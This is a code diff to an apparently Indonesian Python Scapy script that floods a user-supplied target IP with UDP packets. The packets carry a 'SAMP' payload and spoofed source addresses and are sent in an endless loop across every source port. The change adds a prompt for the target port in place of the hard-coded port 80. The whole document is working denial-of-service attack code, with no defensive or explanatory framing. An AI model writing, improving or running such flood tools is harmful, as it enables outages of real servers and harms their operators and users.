@@ -2,6 +2,7 @@ import random
 from scapy.all import *
 
 target_IP = input("Masukkan alamat IP target: ")
+port_target = input("Masukkan port target: ")
 i = 1
 
 while True:
@@ -15,7 +16,7 @@ while True:
     for source_port in range(1, 65535):
         payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
         IP1 = IP(src=source_IP, dst=target_IP)
-        UDP1 = UDP(sport=source_port, dport=80)
+        UDP1 = UDP(sport=source_port, dport=port_target)
         pkt = IP1 / UDP1 / Raw(load=payload)
         send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik
 
